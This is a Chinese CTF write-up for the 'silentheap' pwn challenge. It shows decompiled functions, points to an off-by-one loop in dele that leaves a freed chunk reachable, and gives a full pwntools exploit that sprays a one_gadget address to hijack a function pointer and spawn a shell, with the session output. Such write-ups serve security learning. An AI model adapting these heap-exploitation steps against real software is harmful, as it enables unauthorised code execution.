---
title: 护网杯 silentheap writeup
date: 2019-09-18 16:21:34
tags: 
categories: pwn
---

## 漏洞分析

- 在`dele`函数中,第二次循环并没有循环到9,如果`dele`时输入9,会直接`free`掉`ptr[9]`,此时`dword_804AA60[i]=0`.

```c
int dele()
{
  int result; // eax
  int v1; // [esp+8h] [ebp-10h]
  signed int i; // [esp+Ch] [ebp-Ch]

  result = sub_8048671();
  v1 = result;
  if ( result >= 0 && result <= 9 )
  {
    result = (int)ptr[result];
    if ( result )
    {
      result = dword_804AA60[v1];
      if ( result )
      {
        free(ptr[v1]);
        for ( i = v1; i <= 8 && ptr[i]; ++i )   // vul
        {
          ptr[i] = ptr[i + 1];
          dword_804AA60[i] = dword_804AA60[i + 1];
        }
        result = i;
        dword_804AA60[i] = 0;
      }
    }
  }
  return result;
}
```
- 如果我们对`ptr[9]`分配一个`0x358`的内存的话,在`zhixing`函数时,会调用`ptr[idx+85*4]`地址的函数:  

```x86asm 
.text:08048944 ; __unwind {
.text:08048944                 push    ebp
.text:08048945                 mov     ebp, esp
.text:08048947                 sub     esp, 18h
.text:0804894A                 call    sub_8048671
.text:0804894F                 mov     [ebp+var_C], eax
.text:08048952                 cmp     [ebp+var_C], 0
.text:08048956                 js      short loc_80489C1
.text:08048958                 cmp     [ebp+var_C], 9
.text:0804895C                 jg      short loc_80489C1
.text:0804895E                 mov     eax, [ebp+var_C]
.text:08048961                 mov     eax, ds:ptr[eax*4]
.text:08048968                 test    eax, eax
.text:0804896A                 jz      short loc_80489C4
.text:0804896C                 mov     eax, [ebp+var_C]
.text:0804896F                 mov     eax, ds:dword_804AA60[eax*4]
.text:08048976                 cmp     eax, 2
.text:08048979                 jnz     short loc_804899E
.text:0804897B                 mov     eax, [ebp+var_C]
.text:0804897E                 mov     eax, ds:ptr[eax*4]
.text:08048985                 mov     [ebp+var_10], eax
.text:08048988                 mov     eax, [ebp+var_10]
.text:0804898B                 mov     eax, [eax+354h]
.text:08048991                 sub     esp, 0Ch
.text:08048994                 push    [ebp+var_10]
.text:08048997                 call    eax
.text:08048999                 add     esp, 10h
.text:0804899C                 jmp     short locret_80489C5
.text:0804899E ; ---------------------------------------------------------------------------
.text:0804899E
.text:0804899E loc_804899E:                            ; CODE XREF: zhixing+35↑j
.text:0804899E                 mov     eax, [ebp+var_C]
.text:080489A1                 mov     eax, ds:ptr[eax*4]
.text:080489A8                 mov     [ebp+var_14], eax
.text:080489AB                 mov     eax, [ebp+var_14]
.text:080489AE                 mov     eax, [eax+154h]             //ptr[idx+85*4]
.text:080489B4                 sub     esp, 0Ch
.text:080489B7                 push    [ebp+var_14]
.text:080489BA                 call    eax                           //执行这个函数
.text:080489BC                 add     esp, 10h
.text:080489BF                 jmp     short locret_80489C5
```



- 可以通过修改`aThouWhoArtDark`的值来构构造一个地址为`one_gadget`,原题需要爆破`one_gadget`的地址,这里为了测试关掉了`aslr`.

```c

void new1()
{
  char *v0; // ST18_4
  signed int i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; i <= 9 && ptr[i]; ++i )
    ;
  if ( i <= 9 )
  {
    v0 = (char *)malloc(0x358u);
    strcpy(v0 + 4, aThouWhoArtDark);
    *((_DWORD *)v0 + 213) = sub_8048704;
    ptr[i] = v0;
    dword_804AA60[i] = 2;
  }
}


int edit()
{
  int result; // eax
  int v1; // [esp+Ch] [ebp-Ch]

  result = sub_8048671();
  v1 = result;
  if ( result == 1 )
    result = sub_804861A((int)src, 336);
  if ( v1 == 2 )
    result = sub_804861A((int)aThouWhoArtDark, 848);
  return result;
}

```

## 漏洞利用


exp如下  

```python
#coding:utf-8
from pwn import *
context.log_level = 'debug'


p = process('./silentheap')


def new():
	p.sendline('1')

def new1():
	p.sendline('2')
def zhixing(idx):
	p.sendline('3')
	p.sendline(str(idx))
def dele(idx):
	p.sendline('4')
	p.sendline(str(idx))

def edit(choice,content):
	p.sendline('5')
	p.sendline(str(choice))
	p.sendline(str(content))

for i in range(9):
	new()

one_gadget = 0xf7e40c5c

payload=p32(one_gadget)*100

edit(2,payload)
new1()
dele(9)
zhixing(9)

p.interactive()
```

## getshell

```shell

$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x5 bytes:
    'jcxp\n'
jcxp

```